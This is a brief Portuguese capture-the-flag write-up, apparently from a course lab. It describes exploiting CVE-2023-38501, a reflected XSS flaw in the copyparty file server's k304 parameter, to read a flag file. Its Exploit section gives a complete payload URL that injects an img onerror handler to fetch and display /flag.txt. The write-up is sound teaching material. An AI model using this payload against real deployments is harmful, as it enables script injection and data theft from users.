# XSS

## Reconhecimento

Explorando o servidor encontrámos o ficheiro flag.txt, clicando nele apenas aparecia :

![alt text](screenshots/CTF7_1.png)

Procurando pela razão pela qual não conseguíamos aceder diretamente ao ficheiro utilizámos as Developer Tools para aceder aos pedidos HTTP ao fazer o request http://ctf-fsi.fe.up.pt:5007/flag.txt o que não ajudou pois o servidor retorna o código 200 OK.

![alt text](screenshots/CTF7_2.png)

Usando uma das dicas do enunciado do CTF encontrámos o CVE-2023-38501 relativo à possibilidade de realizar um ataque Reflected XSS nos URL-parameters `?k304=...` e `?setck=...` na versão utilizada do copycat.

![alt text](screenshots/CTF7_3.png)

## Exploit

Assim adaptámos o código para executar a exploit retornando um alerta com o contéudo de um fetch ao flag.txt:

``` 
https://ctf-fsi.fe.up.pt:5007/?k304=y%0D%0A%0D%0A<img+src%3Dcopyparty+onerror%3D"fetch('%2Fflag.txt').then(response%20%3D>%20response.text()).then(data%20%3D>%20alert(data))">>
```

![alt text](screenshots/CTF7_4.png)